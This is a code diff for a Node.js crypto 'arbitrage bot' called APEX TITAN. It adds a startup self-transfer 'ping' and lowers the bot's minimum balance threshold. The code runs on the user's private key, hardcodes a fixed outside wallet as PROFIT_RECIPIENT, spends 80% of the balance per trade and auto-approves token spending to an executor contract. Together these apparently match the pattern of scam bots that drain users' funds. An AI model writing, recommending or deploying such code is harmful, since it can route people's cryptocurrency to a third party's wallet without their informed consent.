@@ -1,13 +1,13 @@
 /**
  * ===============================================================================
- * APEX TITAN v86.0 (CONNECTION STABILIZER) - CLUSTERED MULTI-CHAIN ARBITRAGE
+ * APEX TITAN v87.0 (DIAGNOSTIC MODE) - CLUSTERED MULTI-CHAIN ARBITRAGE
  * ===============================================================================
  * FEATURES:
  * 1. CLUSTERED CORES: Multi-process architecture for zero-latency handling.
  * 2. SATURATION BROADCAST: Dual-channel tx submission (RPC + Fetch).
- * 3. AUTO-PROTOCOL FIX: Automatically converts HTTPS -> WSS to prevent 200 OK errors.
- * 4. AUTO-APPROVAL: Automatically checks and approves tokens.
- * 5. EXPANDED POOLS: Added more backup nodes for stability.
+ * 3. STARTUP PING: Forces a 0 ETH self-transfer on boot to verify write access.
+ * 4. VERBOSE LOGGING: Un-silenced all balance and network errors.
+ * 5. LOWER THRESHOLD: Reduced minimum balance requirement to 0.001 ETH.
  * ===============================================================================
  */
 
@@ -39,9 +39,10 @@ const TXT = { green: "\x1b[32m", gold: "\x1b[38;5;220m", reset: "\x1b[0m", red: 
 const PRIVATE_KEY = process.env.PRIVATE_KEY;
 const EXECUTOR_ADDRESS = process.env.EXECUTOR_ADDRESS;
 const PROFIT_RECIPIENT = "0x458f94e935f829DCAD18Ae0A18CA5C3E223B71DE";
-const TRADE_ALLOCATION_PERCENT = 80; // % of safe balance to use per trade
+const TRADE_ALLOCATION_PERCENT = 80; 
+const MIN_BALANCE_THRESHOLD = parseEther("0.001"); // Lowered to 0.001 ETH
 
-// Token Addresses for Auto-Approval (Base Mainnet defaults)
+// Token Addresses for Auto-Approval
 const TOKENS = {
     WETH: "0x4200000000000000000000000000000000000006",
     USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
@@ -101,14 +102,11 @@ function sanitize(k) {
     return s;
 }
 
-// ============================================================================
-// CLUSTER PRIMARY (MASTER)
-// ============================================================================
 if (cluster.isPrimary) {
     console.clear();
     console.log(`${TXT.gold}${TXT.bold}╔════════════════════════════════════════════════════════╗`);
-    console.log(`║    ⚡ APEX TITAN v86.0 | CONNECTION STABILIZER        ║`);
-    console.log(`║    CORES: ${os.cpus().length} | FIX: AUTO-PROTOCOL REPAIR (HTTPS->WSS)║`);
+    console.log(`║    ⚡ APEX TITAN v87.0 | DIAGNOSTIC MODE              ║`);
+    console.log(`║    CORES: ${os.cpus().length} | THRESHOLD: 0.001 ETH | STARTUP PING: ON ║`);
     console.log(`║    RECIPIENT: ${PROFIT_RECIPIENT.slice(0, 10)}...            ║`);
     console.log(`╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);
 
@@ -150,16 +148,39 @@ async function runWorkerEngine() {
     await initializeHighPerformanceEngine(targetChain, config);
 }
 
-// --- AUTO-APPROVAL LOGIC ---
+// --- STARTUP DIAGNOSTIC PING ---
+async function executeTestPing(chain, wallet, provider) {
+    try {
+        console.log(`${TXT.gold}[${chain}] 🧪 Initiating Startup Ping (0 ETH Self-Transfer)...${TXT.reset}`);
+        const bal = await provider.getBalance(wallet.address);
+        if (bal < parseEther("0.0001")) {
+             console.log(`${TXT.red}[${chain}] PING FAILED: Insufficient ETH for gas.${TXT.reset}`);
+             return;
+        }
+
+        const gasPrice = (await provider.getFeeData()).gasPrice || parseEther("1", "gwei");
+        const tx = {
+            to: wallet.address,
+            value: 0n,
+            gasLimit: 21000n,
+            maxFeePerGas: gasPrice * 120n / 100n,
+            maxPriorityFeePerGas: gasPrice,
+            chainId: NETWORKS[chain].chainId,
+            type: 2
+        };
+
+        const res = await wallet.sendTransaction(tx);
+        console.log(`${TXT.green}[${chain}] ✅ PING SENT! Hash: ${res.hash}${TXT.reset}`);
+    } catch (e) {
+        console.error(`${TXT.red}[${chain}] ❌ PING ERROR: ${e.message}${TXT.reset}`);
+    }
+}
+
 async function checkAndApprove(chain, wallet) {
     if (chain !== 'BASE' && chain !== 'ETHEREUM') return; 
-    if (!EXECUTOR_ADDRESS) {
-        console.log(`${TXT.dim}[${chain}] No Executor Contract defined. Skipping Auto-Approvals.${TXT.reset}`);
-        return;
-    }
+    if (!EXECUTOR_ADDRESS) return;
 
     const erc20Abi = ["function allowance(address,address) view returns (uint256)", "function approve(address,uint256) returns (bool)"];
-    
     try {
         const weth = new Contract(TOKENS.WETH, erc20Abi, wallet);
         const allowance = await weth.allowance(wallet.address, EXECUTOR_ADDRESS);
@@ -175,26 +196,25 @@ async function checkAndApprove(chain, wallet) {
 async function initializeHighPerformanceEngine(name, config) {
     const rpcUrl = config.rpc[poolIndex[name] % config.rpc.length] || config.rpc[0];
     
-    // --- PROTOCOL FIXER ---
-    // If a user puts 'https://' in a WSS variable, this fixes it automatically
     let rawWssUrl = config.wss[poolIndex[name] % config.wss.length] || config.wss[0];
     if (rawWssUrl && rawWssUrl.startsWith('https://')) rawWssUrl = rawWssUrl.replace('https://', 'wss://');
     if (rawWssUrl && rawWssUrl.startsWith('http://')) rawWssUrl = rawWssUrl.replace('http://', 'ws://');
     const wssUrl = rawWssUrl;
 
     console.log(`[${name}] Init RPC: ${rpcUrl}`);
-    console.log(`[${name}] Init WSS: ${wssUrl}`);
 
     const network = ethers.Network.from(config.chainId);
     const provider = new JsonRpcProvider(rpcUrl, network, { staticNetwork: network });
     
-    // Dedicated Base Provider for robust balance checks
+    // Dedicated Base Provider
     const baseNetwork = ethers.Network.from(8453);
     const baseRpcUrl = NETWORKS.BASE.rpc[poolIndex.BASE % NETWORKS.BASE.rpc.length];
     const baseProvider = new JsonRpcProvider(baseRpcUrl, baseNetwork, { staticNetwork: baseNetwork });
 
     const wallet = new Wallet(sanitize(PRIVATE_KEY), provider);
     
+    // RUN STARTUP CHECKS
+    await executeTestPing(name, wallet, provider);
     await checkAndApprove(name, wallet);
 
     let flashbots = null;
@@ -235,9 +255,10 @@ async function initializeHighPerformanceEngine(name, config) {
         if (payload.params && payload.params.result) {
             const txHash = payload.params.result;
             try {
-                // Check balance with LOGGING
+                // Check balance with LOUD LOGGING
                 const currentBalance = await provider.getBalance(wallet.address);
-                if (currentBalance < parseEther("0.005")) {
+                if (currentBalance < MIN_BALANCE_THRESHOLD) {
+                    console.warn(`[${name}] ⚠️ LOW BALANCE: ${formatEther(currentBalance)} ETH. Min required: 0.001 ETH.`);
                     return;
                 }
 
@@ -251,7 +272,7 @@ async function initializeHighPerformanceEngine(name, config) {
                     await executeAbsoluteStrike(name, provider, wallet, flashbots, signal, currentBalance, rpcUrl);
                 }
             } catch (err) { 
-                // Silent fail for speed unless critical
+                console.error(`[${name}] Loop Error: ${err.message}`);
             }
         }
     });
@@ -262,7 +283,7 @@ async function initializeHighPerformanceEngine(name, config) {
     });
     
     ws.on('close', () => { 
-        poolIndex[name]++; // Rotate to next provider
+        poolIndex[name]++; 
         console.log(`[${name}] WS Closed. Cycling to next provider in 5s...`);
         setTimeout(() => initializeHighPerformanceEngine(name, config), 5000); 
     });
